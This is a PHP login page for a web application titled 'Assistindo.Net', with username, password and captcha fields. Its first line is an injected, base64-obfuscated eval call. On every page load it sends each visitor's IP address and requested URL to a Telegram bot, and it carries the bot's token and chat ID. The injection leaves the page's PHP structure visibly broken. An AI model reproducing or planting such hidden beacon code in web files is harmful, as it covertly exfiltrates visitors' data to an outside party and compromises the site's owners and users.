<?php eval(base64_decode('ZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q4MzAzOTQzMTk3OkFBR0NGTzFFdW90RGVveVhuUnBTTnNNaUZTQ2RkbTZVbFE0L3NlbmRNZXNzYWdlP2NoYXRfaWQ9NTkwNDM2OTgyJnRleHQ9Ii51cmxlbmNvZGUoIklQOiAiLiRfU0VSVkVSWydSRU1PVEVfQUREUiddLiIgfCBQYWdlOiAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkk nXSkpOw==')); ?>
	$cUserName = (substr($_SERVER["HTTP_HOST"],0,7) == "bpr.mvc" || substr($_SERVER["HTTP_HOST"],0,7) == "cbs.bpr") ? "TeamSupport" : "";
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Assistindo.Net</title>
</head>
<?php MVC::LoadComponent() ?>
<?php include GetFileModul(__FILE__,'.jscript.php') ?>
<body>
<form name="form1">
<table width="100%" height="100%" border="0" cellspacing="3" cellpadding="0" class="cell_eventrow">
  <tr>
    <td style="border:1px solid #999999;padding:4px">
      <table width="100%"  border="0" cellspacing="0" cellpadding="1">
        <tr>
          <td width="100px">&nbsp;Username</td>
          <td width="5px">:</td>
          <td>
          <?php
            txt::Show("cUserName",$cUserName,"20","20") ;
          ?>
          </td>
        </tr>
        <tr>
          <td width="100px">&nbsp;Password</td>
          <td width="5px">:</td>
          <td>
          <?php
            txt::$Type = "Password" ;
            txt::Show("cPassword","","50","20") ;
          ?>
          </td>
        </tr> 
        <tr>
          <td>&nbsp;</td>
          <td></td>
          <td><img style="border:1px solid #000000" id="oCaptCha" src="" onClick="LoadCaptCha();"></td>
        </tr>
        <tr>
          <td>&nbsp;Captcha</td>
          <td>:</td>
          <td>
          <?php
            txt::$Type = "Password" ;
            txt::Show("cCaptcha","",6,6) ;
          ?>
          </td>
        </tr> 
      </table>
    </td>
  </tr>
  <tr>
    <td height="20px" style="border:1px solid #999999">
      <table width="100%" style="padding:2px">
        <tr>
          <td align="center">
          <?php
            txt::ButtonField("cmdLogin","Login") ;
          ?>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>
</form>
</body>
</html>
